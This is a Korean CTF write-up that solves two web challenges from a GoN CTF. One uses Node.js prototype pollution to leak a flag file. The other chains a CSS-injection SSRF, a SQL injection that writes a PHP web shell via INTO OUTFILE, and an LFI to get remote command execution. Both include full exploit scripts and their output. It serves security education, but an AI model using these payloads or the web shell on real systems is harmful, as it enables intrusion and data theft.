<img src="https://cdn.pocas.kr/CTF/GoN%20CTF/GoN CTF.png" style=" width: 100%; max-width: 100%; height: auto;">

- [[Q] - NSS](#q---nss-897-pts)
- [[V] - ColorfulMemo](#v---colorfulmemo-490-pts)

이번에 카이스트의 해킹 동아리인 GoN 팀에서 CTF를 주최해서 참여했다. 오랜만에 새벽까지 해킹을 했으며 `ColorfulMemo`, `NSS` 총 2문제를 풀었고, `Trino: Albireo` 문제는 분석하다가 어려워서 그만뒀다. Redis to RCE 같은데 복잡했다. 7일중 20시간 정도만 참여한 거 같다. 그리고 원래 Write Up은 모두 영어로 작성하려 했는데 이번 롸업은 문제 풀자 마자 바로 작성하는 거라, 힘들어서 그냥 한글로 작성했다.

---
### (Q) - NSS [897 pts]

NSS는 `Prototype Pollution`을 이용해서 로컬 파일을 릭하는 문제이다. 개인적으로 내가 최근에 풀었던 문제 중에서 제일 재밌었다. 

```sh
❯ tree -I "node_modules"
.
├── Dockerfile
├── file.js
├── flag
├── main.js
├── package-lock.json
├── package.json
├── user.js
└── workspace.js

0 directories, 8 files
```
문제 코드는 위와 같이 주어졌는데 생각보다 많이 없었다.

```docker
FROM node:current-alpine3.15

WORKDIR /usr/src/app

COPY package*.json ./

RUN npm install
RUN npm install -g npm@8.5.4

COPY . .

EXPOSE 80

CMD [ "node", "main.js" ]
```
도커 파일을 확인 해보면 별 다른 설정은 없고 플래그의 경로는 `/usr/src/app/flag`라는 것을 알 수 있었다.

```javascript
const express = require("express");
const bodyParser = require('body-parser');
const app = express(); 

app.use(bodyParser.json());

app.listen(80, () => console.log("[*] Server Started!"));

app.get("/", (req, res) => {
    res.status(204);
});

require('./user.js')(app);
require('./workspace.js')(app);
require('./file.js')(app);
```
main.js는 `user.js`, `workspace.js`, `file.js` 총 3개의 api를 호출하고 있었고, 별 다른 설정은 없었다.

```javascript
const crypto = require('crypto');
const fs = require('fs');
const os = require('os');
const path = require('path');
const appPrefix = 'nss';

users = {};
tokens = {};
salt = crypto.randomBytes(128).toString('base64');

function check_session(userid, token) {
    const sess = tokens[token]
    if(!sess) return false;
    if(sess.owner != userid) return false;
    if(sess.expire < Date.now() / 1000){
        tokens.delete(token);
        return false;
    }
    else return true;
}

function cleanup_user(user) {
    fs.rmSync(user.base_dir, {recursive: true});
};

module.exports = function (app) {
    app.get("/api/users", (req, res) => {
        res.status(200).json({res: true, users: Object.keys(users)});
    });

    app.post("/api/users", (req, res) => {
        const userid = req.body.userid || "";
        const pass = req.body.pass || "";
        if(!userid || !pass)
            return res.status(400).json({ok: false, err: "Invalid userid or password"});
        if(pass.length < 10)
            return res.status(400).json({ok: false, err: "Password too short"});
        const user = users[userid];
        if(user)
            return res.status(400).json({ok: false, err: "ID already exists"});

        base_dir = ""
        try {
            base_dir = fs.mkdtempSync(path.join(os.tmpdir(), appPrefix));
            }
        catch {
            return res.status(500).json({ok: false, err: "Internal server error"});
        };
        if(!base_dir) 
            return res.status(500).json({ok: false, err: "Internal server error"});
            
        
        users[userid] = {
            userid : userid,
            pass : crypto.createHash('sha512').update(pass + salt).digest('hex'),
            workspaces : {},
            base_dir: base_dir
        };
        res.json({ok: true});
    });
    
    app.delete("/api/users", (req, res) => {
        const userid = req.body.userid || "";
        const pass = req.body.pass || "";
        if(!userid || !token)
            return res.status(400).json({ok: false, err: "Invalid userid or token"});
        if(!check_session(userid, token))
            return res.status(403).json({ok: false, err: "Failed to validate session"});
        
        const user = users[userid];

        cleanup_user(user);
        delete user.userid;
        return res.status(200).json({ok: true});
    });

    
    app.post("/api/users/auth", (req, res) => {
        const userid = req.body.userid || "";
        const pass = req.body.pass || "";
        if(!userid || !pass)
            return res.status(400).json({ok: false, err: "Invalid userid or password"});

        const user = users[userid];
        if(!user)
            return res.status(404).json({ok: false, err: "Failed to find user"});

        if(user.pass != crypto.createHash('sha512').update(pass + salt).digest('hex'))
            return res.status(403).json({ok: false, err: "Incorrect password"});
        
        token = crypto.randomBytes(20).toString('hex');
        tokens[token] = {
            owner : userid,
            expire: 30 * 60 + Date.now() / 1000
        };
        res.json({ok: true, token: token});
    });
}

module.exports.check_session = check_session;
module.exports.users = users;
module.exports.tokens = tokens;
```
`user.js`는 사용자를 생성하고, 삭제하고, 로그인하는 기능이 있었다. 사용자를 생성하면 users 객체의 사용자의 정보를 넣어주고, 로그인을 성공하면 tokens 객체의 로그인 한 사용자의 userid로 토큰을 만들어서 넣어준다. 여기서 중요한 것은 사용자를 생성할 때, `base_dir`로 `os.tmpdir()`와 `appPrefix`를 더해서 생성해준다. 즉, 생성되는 사용자의 기본 경로는 `/tmp/*` 하위인 것이다.

```javascript
const fs = require('fs');
const path = require("path");

const user_module = require('./user.js')
const check_session = user_module.check_session;
const users = user_module.users;

function cleanup_workspace(base_dir, workspace){
    for (const f_path in Object.values(workspace)) {
        fs.rmSync(path.join(base_dir, f_path), {recursive: true});
    }
}

module.exports = function (app) {
    app.get("/api/users/:userid", (req, res) => {
        const id = req.params.userid || "";
        const token = req.body.token || "";

        if(!userid || !token)
            return res.status(400).json({ok: false, err: "Invalid userid or token"});
        if(!check_session(userid, token))
            return res.status(403).json({ok: false, err: "Failed to validate session"});

        const user = users[userid];
        res.status(200).json({ok: true, workspace: Object.keys(user.workspaces)});
    });

    app.post("/api/users/:userid", (req, res) => {
        const userid = req.params.userid || "";
        const token = req.body.token || "";
        const ws_name = req.body.ws_name || "";

        if(!userid || !token)
            return res.status(400).json({ok: false, err: "Invalid userid or token"});
        if(!check_session(userid, token))
            return res.status(403).json({ok: false, err: "Failed to validate session"});

        users[userid].workspaces[ws_name] = {};
        res.json({ok: true});
    });

    app.delete("/api/users/:userid", (req, res) => {
        const userid = req.params.userid || "";
        const token = req.body.token || "";
        const ws_name = req.body.ws_name || "";
        
        if(!userid || !token)
            return res.status(400).json({ok: false, err: "Invalid userid or token"});
        if(!check_session(userid, token))
            return res.status(403).json({ok: false, err: "Failed to validate session"});
        
        const user = users[userid];
        if(!ws_name)
            return res.status(400).json({ok: false, err: "Invalid workspace name"});

        const workspace = user.workspaces[ws_name];
        if(!workspace)
            return res.status(404).json({ok: false, err: "Failed to find workspace"});

        cleanup_workspace(workspace);
        delete user.workspace.ws_name;
        return res.status(200).json({ok: true});
    });
}

module.exports.cleanup_workspace = cleanup_workspace;
```
`workspace.js`도 `user.js`과 비슷하다. 사용자의 workspace를 생성하고, 삭제할 수 있는 기능이 있다. `user.js`와 마찬가지로 취약점은 없다.

```javascript
const fs = require('fs');
const path = require("path");

const user_module = require('./user.js')
const check_session = user_module.check_session;
const users = user_module.users;

function write_b64_file(f_path, contents) {
    try {
        if(!fs.existsSync(path.dirname(f_path)))
            fs.mkdirSync(path.dirname(f_path), {recursive: true});
        fs.writeFileSync(f_path, contents,{encoding: 'base64'});
    } catch (e) {
        fs.rmSync(f_path, {recursive: true});
        return false;
    }
    return true;
  }

function read_b64_file(f_path) {
    try{
        return fs.readFileSync(f_path, {encoding: 'base64'});
    } catch (e) {
        return;
    }
}

module.exports = function (app) {
    app.get("/api/users/:userid/:ws", (req, res) => {
        const userid = req.params.userid || "";
        const ws_name = req.params.ws || "";
        const token = req.body.token || "";

        if(!userid || !token)
            return res.status(400).json({ok: false, err: "Invalid userid or token"});

        if(!check_session(userid, token))
            return res.status(403).json({ok: false, err: "Failed to validate session"});

        const user = users[userid];
        if(!ws_name)
            return res.status(400).json({ok: false, err: "Invalid workspace name"});

        const workspace = user.workspaces[ws_name];
        if(!workspace)
            return res.status(404).json({ok: false, err: "Failed to find workspace"});
        
        res.status(200).json({ok: true, workspace: Object.keys(workspace)});
    });

    app.post("/api/users/:userid/:ws", (req, res) => {
        const userid = req.params.userid || "";
        const ws_name = req.params.ws || "";
        const token = req.body.token || "";
        const f_name = req.body.file_name || "";
        const f_path = req.body.file_path.replace(/\./g,'') || "";
        const f_content = req.body.file_content || "";

        if(!userid || !token)
            return res.status(400).json({ok: false, err: "Invalid id or token"});
        if(!check_session(userid, token))
            return res.status(403).json({ok: false, err: "Failed to validate session"});

        const user = users[userid];
        if(!ws_name)
            return res.status(400).json({ok: false, err: "Invalid workspace name"});

        const workspace = user.workspaces[ws_name];
        if(!workspace)
            return res.status(404).json({ok: false, err: "Failed to find workspace"});

        if(!f_name || !f_path)
            return res.status(400).json({ok: false, err: "Invalid file name or path"});

        if(!write_b64_file(path.join(user.base_dir, f_path), f_content))
            return res.status(500).json({ok: false, err: "Internal server error"});

        
        workspace[f_name] = f_path;
        return res.status(200).json({ok: true});
    });

    app.delete("/api/users/:userid/:ws", (req, res) => {
        const userid = req.params.userid || "";
        const ws_name = req.params.ws || "";
        const token = req.body.token || "";
        const f_name = req.body.file_name || "";
        
        if(!userid || !token)
            return res.status(400).json({ok: false, err: "Invalid userid or token"});
        if(!check_session(userid, token))
            return res.status(403).json({ok: false, err: "Failed to validate session"});

        const user = users[userid];
        if(!ws_name)
            return res.status(400).json({ok: false, err: "Invalid workspace name"});

        const workspace = user.workspaces[ws_name];
        console.log(workspace)
        if(!workspace)
            return res.status(404).json({ok: false, err: "Failed to find workspace"});

        if(!f_name)
            return res.status(400).json({ok: false, err: "Invalid file name"});

        const f_path = workspace[f_name];
        if(!f_path)
            return res.status(404).json({ok: false, err: "Failed to find file"});

        fs.rmSync(path.join(user.base_dir, f_path), {recursive: true});
        delete workspace[f_name];
        return res.status(200).json({ok: true});
    });

    app.get("/api/users/:userid/:ws/:fname", (req, res) => {
        const userid = req.params.userid || "";
        const ws_name = req.params.ws || "";
        const f_name = req.params.fname || "";
        const token = req.body.token || "";

        if(!userid || !token)
            return res.status(400).json({ok: false, err: "Invalid userid or token"});
        if(!check_session(userid, token))
            return res.status(403).json({ok: false, err: "Failed to validate session"});

        const user = users[userid];
        if(!ws_name)
            return res.status(400).json({ok: false, err: "Invalid workspace name"});
       
        const workspace = user.workspaces[ws_name];
        if(!workspace)
            return res.status(404).json({ok: false, err: "Failed to find workspace"});

        if(!f_name)
            return res.status(400).json({ok: false, err: "Invalid file name"});

        const f_path = workspace[f_name];

        if(!f_path)
            return res.status(404).json({ok: false, err: "Failed to find file"});
        
        const content = read_b64_file(path.join(user.base_dir, f_path));
        if(typeof content == "undefined")
            return res.status(500).json({ok: false, err: "Internal server error"});

        res.status(200).json({ok: true, file_content: content});
    });
}
```
`file.js`는 문제를 푸는데 핵심적인 부분이다. `file.js`는 사용자의 workspaces 객체 출력, 파일을 생성/삭제, 생성한 파일을 읽어오는 기능이 있다. 하지만 파일 읽기 기능을 보면 `workspace` 객체이 있는 `f_name`의 값을 가져와서, 해당 값을 파일의 경로로 사용한다. 그렇기 때문에 우리가 `f_name`의 값을 조작하면 플래그를 읽을 수 있다.

```javascript
app.post("/api/users/:userid/:ws", (req, res) => {
        const userid = req.params.userid || "";
        const ws_name = req.params.ws || "";
        const token = req.body.token || "";
        const f_name = req.body.file_name || "";
        const f_path = req.body.file_path.replace(/\./g,'') || "";
        const f_content = req.body.file_content || "";

        if(!userid || !token)
            return res.status(400).json({ok: false, err: "Invalid id or token"});
        if(!check_session(userid, token))
            return res.status(403).json({ok: false, err: "Failed to validate session"});

        const user = users[userid];
        if(!ws_name)
            return res.status(400).json({ok: false, err: "Invalid workspace name"});

        const workspace = user.workspaces[ws_name];
        if(!workspace)
            return res.status(404).json({ok: false, err: "Failed to find workspace"});

        if(!f_name || !f_path)
            return res.status(400).json({ok: false, err: "Invalid file name or path"});

        if(!write_b64_file(path.join(user.base_dir, f_path), f_content))
            return res.status(500).json({ok: false, err: "Internal server error"});

        
        workspace[f_name] = f_path;
        return res.status(200).json({ok: true});
    });
```
`f_path`의 값은 파일 생성 로직에서 정의된다. 파일 생성 로직을 보면 `workspace`의 `f_name` 값으로 `f_path`의 값을 넣어준다. 하지만 조건문을 보면 사용자의 `workspace`가 존재하지 않으면 에러가 나는데 이것은 `/api/users/:userid`로 `POST` 요청을 보내서 생성할 수 있다. 그리고 여기서 파일을 만든다고 해도 `base_dir`이 `/tmp/*` 하위이고, `f_path`의 값은 `replace()` 메서드를 이용해서 `.`을 제거하고 있기 때문에 상위로 올라갈 수도 없다. 결론은 기능을 이용해서는 `base_dir`을 벗어날 수 없다.

하지만 여기서 파일을 생성할 때 `Prototype Pollution`이 발생한다. 지금보니 파일을 읽을 때와 삭제할 때도 발생할 거 같다. 하지만 나는 파일을 생성할 때 발생하는 `Prototype Pollution`을 이용했다. `/api/users/:userid/:ws`를 보면 여러 파라미터 값을 가져와서 여러 조건문을 호출한다. 여기서 중요한 것은 사용자의 객체를 호출하는 방식이다.

```plaintext
1. const user = users[userid];
2. const workspace = user.workspaces[ws_name];
3. workspace[f_name] = f_path;
```
위의 순서대로 사용자의 모든 객체를 불러온다. 하지만 여기서 `ws_name`을 검사하지 않아 `__proto__` 프로토타입을 사용할 수 있다.

```plaintext
1. const workspace = user.workspaces[__proto__];
2. workspace[f_name] = f_path;
```
만약 `ws_name`의 값이 `__proto__`일 경우 반환값은 프로토타입 객체이기 때문에 2번에서 `workspace`가 프로토타입 객체가 되고, `f_name`의 값을 이용해서 원하는 내부 프로퍼티를 `f_path`로 요염 시킬 수 있다.

```javascript
const users = {}
users['asdf'] = {
            userid : 'asdf',
            pass : 'asdf',
            workspaces : {'asdf':{}},
            base_dir: '/tmp/a/nss'
        };
user = users['asdf']
const workspace = user.workspaces['__proto__'];
console.log(workspace)
workspace['asdf'] = 'polluted'

console.log(asdf)
```
```sh
❯ node poc.js
[Object: null prototype] {}
polluted
```
즉, 위와 같이 `Prototype Pollution`이 발생한다. 

```http
POST /api/users/asdf/__proto__ HTTP/1.1
Host: localhost:8888
Content-Length: 97
Content-Type: application/json
Connection: close

{
    "token":"b168dbf118c3ee0fe6db7a3d576694b5e11dfae1",
    "file_name":"base_dir",
    "file_path":"/usr/src/app"
}
```
사용자를 생성하고, 위와 같이 요청을 보내면 `base_dir`을 우리가 윈하는 값으로 덮어줄 수 있다. 

```javascript
 app.get("/api/users/:userid/:ws/:fname", (req, res) => {
        const userid = req.params.userid || "";
        const ws_name = req.params.ws || "";
        const f_name = req.params.fname || "";
        const token = req.body.token || "";

        if(!userid || !token)
            return res.status(400).json({ok: false, err: "Invalid userid or token"});
        if(!check_session(userid, token))
            return res.status(403).json({ok: false, err: "Failed to validate session"});

        const user = users[userid];
        if(!ws_name)
            return res.status(400).json({ok: false, err: "Invalid workspace name"});
       
        const workspace = user.workspaces[ws_name];
        if(!workspace)
            return res.status(404).json({ok: false, err: "Failed to find workspace"});

        if(!f_name)
            return res.status(400).json({ok: false, err: "Invalid file name"});

        const f_path = workspace[f_name];
        console.log(f_path)
        if(!f_path)
            return res.status(404).json({ok: false, err: "Failed to find file"});
        
        console.log(`user.base_dir : ${user.base_dir}`)
        const content = read_b64_file(path.join(user.base_dir, f_path));
        if(typeof content == "undefined")
            return res.status(500).json({ok: false, err: "Internal server error"});

        res.status(200).json({ok: true, file_content: content});
    });
```
이제 `flag`를 읽기 위해서는 `f_path`의 값도 `flag`로 만들어줘야 한다. 하지만 이 `f_path`는 `workspace` 객체에 있고, 또 `workspace` 객체는 `workspaces` 객체에 있다. 결국에는 `Prototype Pollution`을 이용해서 새로운 토큰과 임의의 user의 `workspaces` 객체를 임의의로 생성해서 새로운 사용자 객체를 만들어줘야 한다. 그래서 나는 `pass`, `owner`, `expire`, `base_dir`, `flag`(flag는 `f_path`를 가르키는 키 값임), `workspaces`를 오염시켜서 조건을 만족 시키고, 플래그를 얻었다.

```python
from itsdangerous import base64_decode
import requests
import json
import string 
import random

LENGTH = 4
CHALL_URL = "http://host3.dreamhack.games:19598"
#CHALL_URL = "http://localhost:8888" # Locally
STRING_POOL = string.digits
USERNAME = ""
PASSWORD = "aaaaaaaaaaa"
HEADER = {
    "Content-Type":"application/json"
}

for i in range(LENGTH):
    USERNAME += random.choice(STRING_POOL) 
print(f'[+] USERNAME : {USERNAME}')

# Create the User Object
requests.post(CHALL_URL + '/api/users', headers=HEADER, data=json.dumps({"userid":USERNAME, "pass":PASSWORD}))

# Login
token = requests.post(CHALL_URL + '/api/users/auth', headers=HEADER, data=json.dumps({"userid":USERNAME, "pass":PASSWORD})).json()
TOKEN = token['token'] 
print(f"[+] Token : {TOKEN}")

# Prototype Pollution * 6
requests.post(CHALL_URL + f'/api/users/{USERNAME}/__proto__', headers=HEADER, data=json.dumps({"token":TOKEN, "file_name":"pass", "file_path":"pass"}))
requests.post(CHALL_URL + f'/api/users/{USERNAME}/__proto__', headers=HEADER, data=json.dumps({"token":TOKEN, "file_name":"owner", "file_path":"pass"}))
requests.post(CHALL_URL + f'/api/users/{USERNAME}/__proto__', headers=HEADER, data=json.dumps({"token":TOKEN, "file_name":"expire", "file_path":"100000000000"}))
requests.post(CHALL_URL + f'/api/users/{USERNAME}/__proto__', headers=HEADER, data=json.dumps({"token":TOKEN, "file_name":"base_dir", "file_path":"/usr"}))
requests.post(CHALL_URL + f'/api/users/{USERNAME}/__proto__', headers=HEADER, data=json.dumps({"token":TOKEN, "file_name":"src/app/flag", "file_path":"src/app/flag"}))
requests.post(CHALL_URL + f'/api/users/{USERNAME}/__proto__', headers=HEADER, data=json.dumps({"token":TOKEN, "file_name":"workspaces", "file_path":"asdf"}))

# Leak the flag
LEAK_DATA = requests.get(CHALL_URL + '/api/users/pass/__proto__/src%2fapp%2fflag', headers=HEADER, data=json.dumps({"token":"pass"})).json()

try:
    print(f"[+] Leak Data : {base64_decode(LEAK_DATA['file_content'])}")
except:
    print(f"[+] Leak Data : {LEAK_DATA}")
```
위와 같이 익스플로잇 코드를 작성했다. 여기서 웃긴 건 `base_dir`로 `/usr/src/app`을 주고 `f_path`의 값으로 `flag`를 주면 500 에러가 반환됐고, 또 `f_path`의 키 값이 `f_path`와 동일하지 않아도 500 에러가 반환됐다. 이 외에도 여러 에러들이 있는데 진짜 이거 때문에 스트레스 받았다.

```sh
❯ python3 nss-poc.py 
[+] USERNAME : 4896
[+] Token : b9ab24d6a79dda202bf365541d67998a2c5bf5ce
[+] Leak Data : b'GoN{4he_be4uty_0f_pr0t0typ3_p011uti0n}\n'
```
```plaintext
FLAG : GoN{4he_be4uty_0f_pr0t0typ3_p011uti0n}
```

---
### (V) - ColorfulMemo [490 pts]

ColorfulMemo는 `SQL Injection`을 이용해서 웹 쉘을 업로드하고, `LFI` 취약점을 통해 `RCE`를 트리거하는 문제이다. 꽤나 신박했다.

```docker
FROM mysql:8.0-debian

ENV MYSQL_RANDOM_ROOT_PASSWORD=yes
ENV MYSQL_USER=user
ENV MYSQL_PASSWORD=password
ENV MYSQL_DATABASE=colorfulmemo
ENV TZ=Asia/Seoul
ENV OPENSSL_CONF=/dev/null

RUN sed -i 's/deb.debian.org/mirror.kakao.com/g' /etc/apt/sources.list 

RUN apt-get update -y \
 && DEBIAN_FRONTEND=noninteractive \
    apt-get install --no-install-recommends -y \
        gcc wget bzip2 python3-pip python3-setuptools \
        software-properties-common apache2 php php-mysqli \
        chrpath libssl-dev libxft-dev \
        libfreetype6 libfreetype6-dev \
        libfontconfig1 libfontconfig1-dev \
 && rm -rf /var/lib/apt/lists/* /var/www/html/*

COPY ./src/ /var/www/html/
RUN chmod -R 755 /var/www/html

RUN wget -q -O /root/phantomjs-2.1.1-linux-x86_64.tar.bz2 \
    https://bitbucket.org/ariya/phantomjs/downloads/phantomjs-2.1.1-linux-x86_64.tar.bz2 \
 && tar -C /root/ -jxf /root/phantomjs-2.1.1-linux-x86_64.tar.bz2 \
 && cp /root/phantomjs-2.1.1-linux-x86_64/bin/phantomjs /bin/ \
 && rm -rf /root/phantomjs*

RUN pip3 install --no-cache-dir selenium==2.48.0

COPY ./bot.py /bot.py
RUN chmod 755 /bot.py

# Config files
COPY mysql/config/ /etc/mysql/

RUN chown -R www-data:www-data /var/lib/mysql /var/run/mysqld

COPY ./init.sql /docker-entrypoint-initdb.d

EXPOSE 80
EXPOSE 3306

COPY ./run.sh /run.sh
RUN chmod 755 /run.sh

COPY --chown=root:www-data ./flag /flag
RUN chmod 440 /flag && \
    mv /flag /flag_$(md5sum /flag | awk '{print $1}')

ENTRYPOINT ["/run.sh"]
```
도커 파일을 보면 MySQL과 아파치 서버롤 사용하는 것과 flag의 위치는 `/flag_$(md5sum /flag | awk '{print $1}')`라는 것을 알 수 있다.

```sh
~/Downloads/b05d57b0-db9a-4196-a9c0-8db4c0ff5361/src
❯ tree -I "js|bootstrap" 
.
├── check.php
├── header.php
├── include.php
├── index.php
├── list.php
├── main.php
├── read.php
├── submit.php
└── write.php

0 directories, 9 files
```
위 코드들은 백엔드의 코드이다. 여기에서 총 `CSS Injection`, `SQL Injection`, `LFI` 취약점이 존재한다.

```php
<style>
    .content{
        color:<?php echo $color ?>
    }
</style>

<!-- /var/www/html/read.php -->
```
`CSS Injection`은 read.php에서 발생한다. 여기가 매우 중요한 포인트다..

```php
<?php
    $path = $_GET["path"];
    if($path == ""){
        $path = "main";
    }
    $path = "./".$path.".php";
?>

<style>
.body {
    padding-top:5%;
    padding-left:5%;
    padding-right:5%;
}
</style>

<!DOCTYPE html>
<html>
    <head>
        <?php include_once "./include.php"; ?>
    </head>
    <body>
        <?php include_once "./header.php"; ?>
        <div class="body">
            <?php include_once $path; ?>
        </div>
    </body>
</html>
<!-- /var/www/html/index.php -->
```
`LFI` 취약점은 index.php에서 $path 파라미터를 확인하지 않기 때문에 발생한다.

```php
<?php
if($_SERVER["REMOTE_ADDR"] == '127.0.0.1' || $_SERVER["REMOTE_ADDR"] == '::1'){
    $id = $_GET['id'];
    $mysqli = new mysqli('localhost','user','password','colorfulmemo');
    // I believe admin
    $result = $mysqli->query('SELECT adminCheck FROM memo WHERE id = '.$id);
    if($result){
        $row = mysqli_fetch_row($result);
        if($row){
            if($row[0] != 1){
                $stmt = $mysqli->prepare('UPDATE memo SET adminCheck = 1 WHERE id = ?');
                $stmt->bind_param('i',$id);
                $stmt->execute();
                $stmt->close();
            }
        }
    }
}
else{
    die("no hack");
}
# /var/www/html/check.php
?>
```
`SQL Injection`은 check.php에서 $id 파라미터를 확인하지 않기 때문에 발생한다. 하지만 `SQL Injection`은 로컬에서 요청을 보낼 때만 발생한다. 결국 `SSRF` 취약점을 찾아야 한다.


```python
from selenium import webdriver
import time
import sys, os

memoid = sys.argv[1]

driver = webdriver.PhantomJS(service_log_path='/dev/null')
driver.implicitly_wait(10)
driver.get("http://localhost/read.php?id=" + memoid)
driver.get("http://localhost/check.php?id=" + memoid)
```
```php
<?php
$id = $_GET['id'];
if(ctype_digit($id)){
    exec("python3 /bot.py ".$id);
}
else{
    die("no hack");
}
die('<script> location.href="/" </script>');
?>
```
submit.php에서 bot.py를 호출하는데, 이것은 `ctype_digit()` 함수를 이용해서 $id 파라미터를 확인하기 때문에 악용할 수 없다. 하지만 우리는 CSS의 `background: url()`을 이용해서 `SSRF` 공격을 할 수 있다. 그래서 글 작성 기능을 이용해 color의 값으로 `SSRF` PoC를 박기로 했다.

![](https://user-images.githubusercontent.com/49112423/158553191-baf50b5b-22c5-4779-8f85-fcdd48168b82.png)
```http
POST /?path=write HTTP/1.1
Host: host1.dreamhack.games:9111
Content-Length: 95
Content-Type: application/x-www-form-urlencoded
Connection: close

memoTitle=asdf&memoColor=aqua}.content{background:%20url('https://google.com')&memoContent=adsf
```
나는 위와 같이 `SSRF` PoC를 삽입하고, 접속을 하니 `/check.php`로 요청이 정상적으로 가는 것을 볼 수 있었다. 여기서 만약 글을 신고한다면 5초 동안 슬립이 발생하는 것을 볼 수 있으며 사진은 생략했다.

```conf
[mysqld]
pid-file        = /var/run/mysqld/mysqld.pid
socket          = /var/run/mysqld/mysqld.sock
datadir         = /var/lib/mysql
secure-file-priv= /tmp/
default_authentication_plugin=mysql_native_password

# Custom config should go here
!includedir /etc/mysql/conf.d/
```
이제 `SQL Injection`을 이용해서 웹쉘을 업로드 해야 한다. 그래서 나는 `/var/www/html/cmd.php`로 웹쉘 업로드를 시도했지만 실패했다. 이유를 찾기 위해서 코드를 보니 `secure-file-priv`의 값이 `/tmp`로 되어 있었기 때문이다. 

```http
POST /?path=write HTTP/1.1
Host: host1.dreamhack.games:9111
Content-Length: 220
Content-Type: application/x-www-form-urlencoded
Connection: close

memoTitle=asdf&memoColor=aqua}.content{background:%20url('/check.php?id=99999%20union%20select%20concat(char(60),"?php%20echo%20system($_GET[\'cmd\']);%20?",char(62))%20into%20outfile%20"/tmp/cmd1.php"')&memoContent=adsf
```
그래서 나는 위와 같이 웹쉘을 `/tmp/cmd1.php` 경로에 생성하는 `SQL Injection` 페이로드를 삽입하고, 신고 기능을 통해 웹쉘을 업로드 했다.

```python
import requests
import string 
import random
import re

CHALLURL = "http://host2.dreamhack.games:16301"
LENGTH = 6

string_pool = string.digits
filename = ""

for i in range(LENGTH):
    filename += random.choice(string_pool) 

FILANAME = filename + '.php'
print(f'[+] FILANAME : {FILANAME}')

MEMODATA = {
    'memoTitle':'asdf',
    'memoColor':'aqua}.content{background: url(\'/check.php?id=9999999 union select concat(char(60),"?php echo system($_GET[\\\'cmd\\\']); ?",char(62)) into outfile "/tmp/' + FILANAME + '"\')',
    'memoContent':'asdf'
}
requests.post(CHALLURL + '/?path=write')
print(f'[+] MEMODATA : {MEMODATA}')

requests.post(CHALLURL + '/?path=write', data=MEMODATA)
POST_COUNT = re.findall('\<th scope\=\"row\"\>[0-9]*\<\/th\>', requests.get(CHALLURL + '/?path=list').text)
REPORT_NUM = POST_COUNT[-1].split('<th scope="row">')[1].split('</th>')[0]

requests.get(CHALLURL + f'/submit.php?id={REPORT_NUM}')
print("\n[+] Enable webshell!!")

while(1):
    payload = input("[+] Enter the command : ")
    RESULT = requests.get(CHALLURL + f'/?path=../../../../../../tmp/{filename}&cmd={payload}').text.split('<div class="body">')[1].split('</div>')[0].strip()
    print(RESULT)
```
위와 같이 익스플로잇 코드를 작성했다.

```plaintext
❯ python3 poc.py
[+] FILANAME : 367455.php
[+] MEMODATA : {'memoTitle': 'asdf', 'memoColor': 'aqua}.content{background: url(\'/check.php?id=9999999 union select concat(char(60),"?php echo system($_GET[\\\'cmd\\\']); ?",char(62)) into outfile "/tmp/367455.php"\')', 'memoContent': 'asdf'}

[+] Enable webshell!!
[+] Enter the command : id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
uid=33(www-data) gid=33(www-data) groups=33(www-data)
[+] Enter the command : pwd
/var/www/html
/var/www/html
[+] Enter the command : ls / | grep '^flag'
flag_47ef1a0fd43364198f2422159badba75
flag_47ef1a0fd43364198f2422159badba75
[+] Enter the command : cat /flag_47ef1a0fd43364198f2422159badba75
GoN{cH41N_0f_W3b_VuLn3r4b1l1t1E5}GoN{cH41N_0f_W3b_VuLn3r4b1l1t1E5}
[+] Enter the command : 
```
```plaintext
FLAG : GoN{cH41N_0f_W3b_VuLn3r4b1l1t1E5}
```

---
<script>
  link = document.createElement('link');
  link.setAttribute('rel', 'shortcut icon');
  link.setAttribute('type','image/x-icon');
  link.setAttribute('href','https://kr.object.ncloudstorage.com/dreamhack-content/ctf/65931ceea93ae773bbc9db3692e3ad9966557054aa51905986c86c68af34ee69.png');
  head = document.getElementsByTagName('head');
  head[0].appendChild(link);
</script>
